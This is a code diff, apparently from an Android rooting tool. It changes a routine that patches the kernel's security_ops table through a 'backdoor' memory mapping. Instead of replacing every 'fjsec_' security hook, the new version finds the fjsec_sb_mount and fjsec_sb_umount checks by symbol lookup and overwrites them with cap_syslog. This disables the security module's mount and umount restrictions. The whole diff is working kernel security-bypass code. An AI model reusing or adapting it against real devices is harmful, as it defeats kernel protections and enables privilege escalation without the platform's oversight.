@@ -23,14 +23,18 @@
 
 #define RESTRICTED_CAP_PREFIX	"fjsec_"
 #define DEFAULT_CAP_FUNCTION	"cap_syslog"
+#define CHECK_MOUNT_FUNCTION    "fjsec_sb_mount"
+#define CHECK_UMOUNT_FUNCTION   "fjsec_sb_umount"
 
 static const char security_ops_tag[SECURITY_NAME_MAX + 1] = "fjsec";
 
 bool
-unlock_lsm(void)
+unlock_mount(void)
 {
   unsigned long int *security_ops;
   unsigned long int fix_func;
+  unsigned long int check_mount_func;
+  unsigned long int check_umount_func;
   kallsyms *info;
   int count = 0;
   int i;
@@ -55,6 +59,16 @@ unlock_lsm(void)
     return false;
   }
 
+  check_mount_func = kallsyms_in_memory_lookup_name(info, CHECK_MOUNT_FUNCTION);
+  if (!check_mount_func) {
+    printf("check_mount_func <%s>: not found\n", CHECK_MOUNT_FUNCTION);
+  }
+
+  check_umount_func = kallsyms_in_memory_lookup_name(info, CHECK_UMOUNT_FUNCTION);
+  if (!check_umount_func) {
+    printf("check_umount_func <%s>: not found\n", CHECK_UMOUNT_FUNCTION);
+  }
+
   for (i = SECURITY_OPS_OFFSET; i < SECURITY_OPS_OFFSET + NUM_SECURITY_OPS; i++) {
     if (security_ops[i]) {
       const char *name = kallsyms_in_memory_lookup_address(info, security_ops[i]);
@@ -62,11 +76,10 @@ unlock_lsm(void)
         break;
       }
 
-      printf("0x%08x = 0x%08x <%s>\n", backdoor_convert_to_kernel_address(&security_ops[i]), security_ops[i], name);
-
-      if (strncmp(name, RESTRICTED_CAP_PREFIX, sizeof (RESTRICTED_CAP_PREFIX) - 1) == 0) {
-      	security_ops[i] = (unsigned long int)fix_func;
-      	count++;
+      if ((check_mount_func && security_ops[i] == check_mount_func)
+       || (check_umount_func && security_ops[i] == check_umount_func)) {
+        security_ops[i] = (unsigned long int)fix_func;
+        count++;
       }
     }
   }
@@ -90,7 +103,7 @@ do_unlock(void)
     return false;
   }
 
-  ret = unlock_lsm();
+  ret = unlock_mount();
 
   backdoor_close_mmap();
   return ret;
